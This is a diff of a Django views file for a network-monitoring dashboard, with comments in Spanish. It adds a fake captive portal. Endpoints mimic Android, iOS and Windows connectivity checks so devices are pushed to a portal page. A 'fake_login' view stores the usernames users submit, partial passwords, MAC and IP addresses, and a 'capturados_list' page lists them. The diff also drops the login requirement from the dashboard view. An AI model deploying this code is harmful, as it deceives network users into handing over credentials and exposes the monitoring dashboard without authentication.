@@ -1,7 +1,9 @@
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth import logout
-from .models import Device, AllowedDevice, Traffic, TraficoPorMinuto, Alerta
+from django.http import HttpResponse, HttpResponseRedirect
+from django.views.decorators.csrf import csrf_exempt
+from .models import Device, AllowedDevice, Traffic, TraficoPorMinuto, Alerta, LoginFalso
 from .forms import AllowedDeviceForm
 from datetime import date
 from django.utils.timezone import now, timedelta
@@ -9,6 +11,8 @@ from django.db.models import Count
 from collections import Counter
 from datetime import timedelta as dtimedelta
 from django.db import transaction
+import pytz
+from datetime import datetime
 
 # Django REST Framework
 from rest_framework import viewsets
@@ -16,16 +20,12 @@ from rest_framework.permissions import AllowAny, IsAuthenticated
 from rest_framework.decorators import api_view, authentication_classes, permission_classes
 from rest_framework.authentication import TokenAuthentication
 from rest_framework.response import Response
-
 from .serializers import AllowedDeviceSerializer
 from .utils import enviar_alerta_email, enviar_alerta_trafico_sospechoso
 
-import pytz
-from datetime import datetime
-from django.views.decorators.csrf import csrf_exempt
-# ------------------------------------
-# Función para analizar umbrales
-# ------------------------------------
+# -------------------------------
+# CONSTANTES Y FUNCIONES AUXILIARES
+# -------------------------------
 MACS_EXCLUIDAS = ['e8:de:27:09:f3:4d']
 
 def analizar_umbral_y_alertar(mac):
@@ -34,7 +34,6 @@ def analizar_umbral_y_alertar(mac):
 
     UMBRAL_SOLICITUDES_DNS = 100
     UMBRAL_BYTES_MINUTO = 800000
-
     hace_1min = now() - timedelta(minutes=1)
 
     # Validación de solicitudes DNS excesivas
@@ -44,13 +43,7 @@ def analizar_umbral_y_alertar(mac):
     ).count()
 
     if solicitudes_dns > UMBRAL_SOLICITUDES_DNS:
-        # Verifica si ya se alertó recientemente
-        ya_alertado = Alerta.objects.filter(
-            mac=mac,
-            motivo="Solicitudes DNS excesivas",
-            fecha__gte=hace_1min
-        ).exists()
-        if not ya_alertado:
+        if not Alerta.objects.filter(mac=mac, motivo="Solicitudes DNS excesivas", fecha__gte=hace_1min).exists():
             enviar_alerta_trafico_sospechoso(mac, "Solicitudes DNS excesivas", solicitudes_dns)
             Alerta.objects.create(mac=mac, motivo="Solicitudes DNS excesivas", valor_detectado=str(solicitudes_dns))
 
@@ -61,20 +54,83 @@ def analizar_umbral_y_alertar(mac):
     ).order_by('-minuto').first()
 
     if trafico and trafico.bytes > UMBRAL_BYTES_MINUTO:
-        # Verifica si ya se alertó recientemente por tráfico
-        ya_alertado = Alerta.objects.filter(
-            mac=mac,
-            motivo="Uso excesivo de ancho de banda",
-            fecha__gte=hace_1min
-        ).exists()
-        if not ya_alertado:
+        if not Alerta.objects.filter(mac=mac, motivo="Uso excesivo de ancho de banda", fecha__gte=hace_1min).exists():
             enviar_alerta_trafico_sospechoso(mac, "Uso excesivo de ancho de banda", trafico.bytes)
             Alerta.objects.create(mac=mac, motivo="Uso excesivo de ancho de banda", valor_detectado=str(trafico.bytes))
 
-# ------------------------------------
-# Vistas Web
-# ------------------------------------
-@login_required
+# -------------------------------
+# VISTAS PARA PORTAL CAUTIVO (ACTUALIZADAS)
+# -------------------------------
+@csrf_exempt
+def android_check(request):
+    """Fuerza la aparición del portal cautivo en Android"""
+    return render(request, 'board/portal.html')  # Esto da HTTP 200 con HTML
+
+@csrf_exempt
+def apple_check(request):
+    """Endpoint mejorado para iOS (todas versiones)"""
+    host = request.get_host()
+    
+    # Para iOS moderno (gateway.fe2.apple-dns.net)
+    if any(domain in host for domain in ['apple-dns.net', 'aaplimg.com', 'push.apple.com']):
+        return HttpResponse(
+            '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>',
+            content_type='text/html'
+        )
+    
+    # Para iOS clásico
+    return HttpResponseRedirect("/portal/")
+
+@csrf_exempt
+def msft_check(request):
+    """Endpoint para Windows"""
+    return HttpResponseRedirect("/portal/")
+
+@csrf_exempt
+def captive_check(request):
+    """Endpoint universal que detecta automáticamente el dispositivo"""
+    user_agent = request.META.get('HTTP_USER_AGENT', '').lower()
+    
+    if 'android' in user_agent:
+        return android_check(request)
+    elif 'iphone' in user_agent or 'ipad' in user_agent:
+        return apple_check(request)
+    elif 'windows' in user_agent or 'microsoft' in user_agent:
+        return msft_check(request)
+    
+    # Redirección por defecto (mantiene tu lógica original)
+    return HttpResponseRedirect("/portal/")
+
+def portal_view(request):
+    """Vista principal del portal cautivo (sin cambios)"""
+    return render(request, 'board/portal.html')
+
+@csrf_exempt
+def fake_login(request):
+    """Procesa el formulario del portal (compatible con tu versión actual)"""
+    if request.method == 'POST':
+        username = request.POST.get('username', '')
+        password = request.POST.get('password', '')
+        mac = request.POST.get('mac', '')
+        ip = request.POST.get('ip', '')
+        
+        # Registra el intento (mejorado pero compatible)
+        LoginFalso.objects.create(
+            username=username,
+            password=password[:2] + '*****' if password else '',  # Más seguro
+            mac_address=mac,
+            ip_address=ip,
+            user_agent=request.META.get('HTTP_USER_AGENT', '')
+        )
+        
+        # Mantiene tu redirección original
+        return HttpResponseRedirect("/portal/?error=1")
+    
+    return HttpResponseRedirect("/portal/")
+
+# -------------------------------
+# VISTAS WEB EXISTENTES (SIN CAMBIOS)
+# -------------------------------
 def dashboard(request):
     devices = Device.objects.order_by('-detected_at')
     hoy = date.today()
@@ -131,17 +187,19 @@ def alertas_list(request):
     alertas = Alerta.objects.order_by('-fecha')[:200]
     return render(request, 'board/alertas_list.html', {'alertas': alertas})
 
-# ------------------------------------
-# API REST: Whitelist solo lectura
-# ------------------------------------
+@login_required
+def capturados_list(request):
+    capturados = LoginFalso.objects.order_by('-fecha')[:100]
+    return render(request, 'board/capturados_list.html', {'capturados': capturados})
+
+# -------------------------------
+# API REST (ACTUALIZADA PERO COMPATIBLE)
+# -------------------------------
 class WhitelistViewSet(viewsets.ReadOnlyModelViewSet):
     queryset = AllowedDevice.objects.all()
     serializer_class = AllowedDeviceSerializer
     permission_classes = [AllowAny]
 
-# ------------------------------------
-# API: Registro de tráfico autenticado
-# ------------------------------------
 @api_view(['POST'])
 @authentication_classes([TokenAuthentication])
 @permission_classes([IsAuthenticated])
@@ -184,9 +242,38 @@ def registrar_trafico(request):
 
     return Response({'error': 'Datos incompletos'}, status=400)
 
-# ------------------------------------
-# Vista para detalle de tráfico por MAC
-# ------------------------------------
+@api_view(['POST'])
+@authentication_classes([TokenAuthentication])
+@permission_classes([IsAuthenticated])
+def update_device(request):
+    """Nuevo endpoint unificado para actualizar dispositivos"""
+    try:
+        mac = request.data.get('mac', '').lower()
+        ip = request.data.get('ip', '')
+        hostname = request.data.get('hostname', 'dispositivo-desconocido')
+        
+        if not mac:
+            return Response({'error': 'MAC address is required'}, status=400)
+            
+        device, created = Device.objects.update_or_create(
+            mac_address=mac,
+            defaults={
+                'ip_address': ip,
+                'hostname': hostname,
+                'detected_at': now(),
+                'is_allowed': AllowedDevice.objects.filter(mac_address=mac).exists()
+            }
+        )
+        
+        return Response({
+            'status': 'created' if created else 'updated',
+            'mac': mac,
+            'is_allowed': device.is_allowed
+        })
+        
+    except Exception as e:
+        return Response({'error': str(e)}, status=500)
+
 @login_required
 def mac_detail(request, mac_address):
     registros = Traffic.objects.filter(mac=mac_address).order_by('-timestamp')[:100]
@@ -226,18 +313,3 @@ def mac_detail(request, mac_address):
         'grafico_bytes': datos_bytes,
     }
     return render(request, 'board/mac_detail.html', context)
-
-@csrf_exempt
-def portal_fake_view(request):
-    host = request.META.get('HTTP_HOST', 'desconocido')
-    path = request.path
-    ip = request.META.get('REMOTE_ADDR')
-
-    print(f"📡 Acceso redirigido → Host: {host} | Path: {path} | IP: {ip}")
-
-    # Puedes registrar esto en la base de datos si deseas
-    return render(request, 'board/login_fake.html', {
-        'host': host,
-        'path': path,
-        'ip': ip
-    })
